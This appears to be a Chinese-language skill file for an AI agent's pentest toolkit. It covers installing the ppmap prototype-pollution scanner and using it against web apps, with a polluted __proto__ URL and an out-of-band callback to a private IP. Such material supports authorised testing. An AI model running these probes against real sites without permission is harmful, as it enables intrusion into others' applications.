---
name: ppmap-proto-pollution
description: 渗透工具 skill:ppmap 的安装、参数速查与攻击场景 playbook。当任务涉及 Web应用漏洞利用 需要调用 ppmap 时使用。
---

# ppmap

- 攻击大类:C09 Web应用漏洞利用
- 上游仓库:https://github.com/kleiton0x00/ppmap
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/kleiton0x00/ppmap && cd ppmap && go build
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./ppmap 'https://t.com/?__proto__[test]=test'` | 原型链污染检测 |
| `-c 'http://10.0.0.5:4444'` | 带 OOB 回调 |

## 攻击场景 Playbook

### 原型链污染验证

```bash
./ppmap 'https://t.com/search?q=x'
# 自动遍历常见 gadget
```

## 注意事项

Go 编写的原型链污染扫描,检测 gadget 自动验证。
